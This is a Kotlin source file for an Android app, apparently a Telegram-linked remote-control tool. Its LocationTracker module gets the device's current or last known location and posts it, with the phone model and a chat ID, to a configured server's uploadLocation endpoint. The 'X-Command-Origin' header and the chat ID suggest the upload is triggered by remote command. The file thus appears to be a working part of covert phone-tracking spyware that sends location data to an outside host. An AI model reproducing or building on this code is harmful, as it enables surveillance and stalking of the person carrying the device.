package com.kashem.shaikh.telegram

import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.os.Build
import android.os.Bundle
import android.os.Looper
import android.util.Log
import androidx.core.content.ContextCompat
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import org.json.JSONObject
import java.io.IOException
import com.kashem.shaikh.AppLogs
import com.kashem.shaikh.MainActivity

object LocationTracker {
    private const val TAG = "LocationTracker"
    private val client = OkHttpClient.Builder()
        .connectTimeout(15, java.util.concurrent.TimeUnit.SECONDS)
        .build()
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    private var isLocationAccuracyCheckPending = false
    private var pendingCommandOrigin: String? = null
    private var pendingOnResult: ((Boolean) -> Unit)? = null
    private var pendingContext: Context? = null

    fun onLocationAccuracyResult(context: Context, origin: String, onResult: ((Boolean) -> Unit)?) {
        pendingContext = context
        pendingCommandOrigin = origin
        pendingOnResult = onResult
        collectAndSendLocationInternal(context, origin, onResult)
    }

    fun collectAndSendLocation(
        context: Context,
        commandOrigin: String = "user",
        onResult: ((Boolean) -> Unit)? = null
    ) {
        if (!hasLocationPermission(context)) {
            AppLogs.error("Location permission not granted")
            onResult?.invoke(false)
            return
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            if (!isLocationAccuracyEnabled(context)) {
                AppLogs.debug("Location Accuracy not enabled, requesting...")
                isLocationAccuracyCheckPending = true
                pendingCommandOrigin = commandOrigin
                pendingOnResult = onResult
                pendingContext = context
                val intent = Intent(context, MainActivity::class.java).apply {
                    flags = Intent.FLAG_ACTIVITY_NEW_TASK
                    putExtra("request_location_accuracy", true)
                }
                context.startActivity(intent)
                return
            }
        }

        collectAndSendLocationInternal(context, commandOrigin, onResult)
    }

    private fun collectAndSendLocationInternal(
        context: Context,
        commandOrigin: String,
        onResult: ((Boolean) -> Unit)?
    ) {
        val locationManager = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
        if (!isProviderEnabled(locationManager)) {
            AppLogs.error("No location provider enabled")
            onResult?.invoke(false)
            return
        }

        val lastLocation = getLastBestLocation(locationManager)
        if (lastLocation != null && System.currentTimeMillis() - lastLocation.time < 30_000) {
            AppLogs.debug("Using last known location from ${lastLocation.provider}")
            uploadLocation(context, lastLocation.latitude, lastLocation.longitude, commandOrigin, onResult)
            return
        }

        requestFreshLocation(context, locationManager, commandOrigin, onResult)
    }

    private fun isLocationAccuracyEnabled(context: Context): Boolean {
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                val locationManager = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
                locationManager.isLocationEnabled
            } else {
                true
            }
        } catch (e: Exception) {
            AppLogs.error("Error checking location accuracy: ${e.message}", e)
            true
        }
    }

    private fun hasLocationPermission(context: Context): Boolean {
        return ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
                ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED
    }

    private fun isProviderEnabled(locationManager: LocationManager): Boolean {
        return locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER) ||
                locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)
    }

    private fun getLastBestLocation(locationManager: LocationManager): Location? {
        var best: Location? = null
        val providers = listOf(LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER)
        for (provider in providers) {
            try {
                val last = locationManager.getLastKnownLocation(provider)
                if (last != null && (best == null || last.accuracy < best.accuracy)) {
                    best = last
                }
            } catch (e: SecurityException) {
                AppLogs.warn("Security exception getting last location from $provider")
            }
        }
        return best
    }

    private fun requestFreshLocation(
        context: Context,
        locationManager: LocationManager,
        commandOrigin: String,
        onResult: ((Boolean) -> Unit)?
    ) {
        var resultSent = false
        val locationListener = object : LocationListener {
            override fun onLocationChanged(location: Location) {
                if (!resultSent) {
                    resultSent = true
                    locationManager.removeUpdates(this)
                    AppLogs.debug("Got fresh location: ${location.latitude},${location.longitude}")
                    uploadLocation(context, location.latitude, location.longitude, commandOrigin, onResult)
                }
            }
            override fun onProviderDisabled(provider: String) {}
            override fun onProviderEnabled(provider: String) {}
            override fun onStatusChanged(provider: String, status: Int, extras: Bundle) {}
        }

        try {
            val providers = mutableListOf<String>()
            if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER))
                providers.add(LocationManager.NETWORK_PROVIDER)
            if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER))
                providers.add(LocationManager.GPS_PROVIDER)

            if (providers.isEmpty()) {
                onResult?.invoke(false)
                return
            }

            for (provider in providers) {
                try {
                    locationManager.requestLocationUpdates(provider, 0L, 0f, locationListener, Looper.getMainLooper())
                } catch (e: SecurityException) {
                    AppLogs.error("Security exception requesting $provider", e)
                }
            }

            scope.launch {
                delay(15_000)
                if (!resultSent) {
                    resultSent = true
                    locationManager.removeUpdates(locationListener)
                    AppLogs.warn("Location request timeout")
                    val lastLocation = getLastBestLocation(locationManager)
                    if (lastLocation != null) {
                        uploadLocation(context, lastLocation.latitude, lastLocation.longitude, commandOrigin, onResult)
                    } else {
                        onResult?.invoke(false)
                    }
                }
            }
        } catch (e: Exception) {
            AppLogs.error("Exception requesting location: ${e.message}", e)
            onResult?.invoke(false)
        }
    }

    private fun uploadLocation(
        context: Context,
        lat: Double,
        lon: Double,
        commandOrigin: String,
        onResult: ((Boolean) -> Unit)?
    ) {
        val urls = ConfigManager.getServerUrls(context) ?: run {
            onResult?.invoke(false)
            return
        }
        val (host, _) = urls
        val chatId = urls.chatId

        val url = if (host.endsWith("/")) {
            "${host}uploadLocation"
        } else {
            "${host}/uploadLocation"
        }

        val json = JSONObject().apply {
            put("lat", lat)
            put("lon", lon)
            put("timestamp", System.currentTimeMillis())
        }
        val body = RequestBody.create("application/json".toMediaType(), json.toString())
        val request = Request.Builder()
            .url(url)
            .post(body)
            .addHeader("model", android.os.Build.MODEL)
            .addHeader("chatId", chatId)
            .addHeader("X-Command-Origin", commandOrigin)
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                AppLogs.logLocation(lat, lon, false, e.message, commandOrigin)
                onResult?.invoke(false)
            }
            override fun onResponse(call: Call, response: Response) {
                val success = response.isSuccessful
                if (success) {
                    AppLogs.logLocation(lat, lon, true, origin = commandOrigin)
                } else {
                    AppLogs.logLocation(lat, lon, false, "HTTP ${response.code}", commandOrigin)
                }
                response.close()
                onResult?.invoke(success)
            }
        })
    }

    fun cancel() {
        scope.cancel()
    }
}